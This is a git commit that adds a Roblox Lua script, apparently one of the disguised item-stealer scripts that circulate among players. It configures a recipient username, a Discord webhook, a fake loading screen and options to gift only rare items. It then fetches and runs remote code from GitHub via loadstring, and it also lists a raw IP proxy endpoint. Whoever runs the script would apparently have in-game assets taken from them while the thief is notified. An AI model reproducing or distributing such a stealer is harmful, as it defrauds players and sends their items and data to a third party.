e79790fa2b10ab6db1bd372a26c90b0dbf125d0b
officialzackmlbb-droid <officialzackmlbb@gmail.com>
2025-08-03 15:05:11 +0800

    Upload legendary-script.lua via Script Source Converter

---
+++ legendary-script.lua
@@ -0,0 +1,14 @@
+_G.NullConfig = {
+    User = {"Wahabamer"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1401214036322029579/v5NHqJJag7xF4K-52wW1GeG5ZQz1KXPdSr2y6mUonwvd8xOAUjoY8OgydTQdV-150kG7",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/37f07f9d721b321ab1213c262e627351",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/loader/refs/heads/main/darkspawner"))()",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
